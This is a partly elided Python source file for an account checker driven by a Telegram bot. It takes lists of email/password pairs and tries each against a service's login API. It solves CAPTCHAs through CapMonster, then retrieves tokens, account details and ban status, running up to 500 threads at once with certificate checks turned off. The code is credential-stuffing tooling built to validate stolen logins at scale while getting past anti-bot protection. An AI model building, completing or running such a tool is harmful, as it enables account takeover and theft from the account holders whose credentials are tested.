...
class AccountChecker:
    ...
    def solve_cn31(self, max_retries=1):
        """Solve CAPTCHA using CapMonster with ultra-fast timing."""
        for retry in range(max_retries):
            try:
                ...
                # Ultra-fast timing for small account batches
                for i in range(25):  # Reduced from 30 to 25
    ...
    def check_account_simple(self, email, password):
        """Ultra-optimized account check with reduced timeouts."""
        ...
        try:
            ...
            login_res = session.post(self.ACCOUNT_API, json=login_payload, headers=headers, timeout=10)
            ...
            if message == "Error_Success":
                ...
                if guid and sess:
                    # Get basic account info with timeout handling
    ...
    def get_token(self, guid, sess, session):
        ...
        try:
            res = session.post(url, json=payload, timeout=6, verify=False)
            result = res.json()
    ...
    def get_info(self, jwt_token, session):
        ...
        try:
            res = session.post(url, headers=headers, json={}, timeout=6, verify=False)
    ...
    def check_ban_status(self, jwt_token, session):
        ...
        try:
            res = session.post(url, headers=headers, json=payload, timeout=6, verify=False)
            if res.status_code != 200:
...
class TelegramBot:
    ...
    async def process_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE, accounts: List[Tuple[str, str]], api_key: str):
        ...
        # Optimize threads based on account count for better speed
        if len(accounts) <= 100:
            # For small lists, use aggressive threading
            optimal_threads = min(200, len(accounts) * 2)
        else:
            # For larger lists, use the fixed 500 threads
            optimal_threads = min(500, len(accounts))
        
        # Calculate realistic time estimate
        if len(accounts) <= 100:
            estimated_time = "30 seconds - 2 minutes"
        else:
            estimated_time = f"{max(1, len(accounts) // 20)} minutes"
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=optimal_threads, thread_name_prefix="AccountChecker") as executor:
                ...
                # Process results with optimized timeouts
                from concurrent.futures import as_completed
                
                completed_count = 0
                for future in as_completed(futures, timeout=len(accounts) * 3):  # 3 seconds per account max
                    try:
                        future.result(timeout=20)  # 20 second timeout per account
                        completed_count += 1
